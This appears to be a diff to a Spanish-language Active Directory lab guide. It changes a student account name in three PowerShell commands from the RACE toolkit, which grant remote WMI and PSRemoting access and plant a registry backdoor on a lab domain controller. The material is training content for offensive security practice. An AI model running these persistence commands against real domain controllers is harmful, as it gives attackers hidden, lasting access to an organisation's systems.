@@ -1059,9 +1059,9 @@ Cargar el modulo *RACE*
 ```
 
 ```shell
-Set-RemoteWMI -SamAccountName student867 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
-Set-RemotePSRemoting -SamAccountName student867 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
-Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student867 -Verbose
+Set-RemoteWMI -SamAccountName student97 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
+Set-RemotePSRemoting -SamAccountName student97 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student97 -Verbose
 ```
 
 Ahora desde una nueva shell ejecutaremos *InviShell* y verificaremos si se han aplicado los cambios
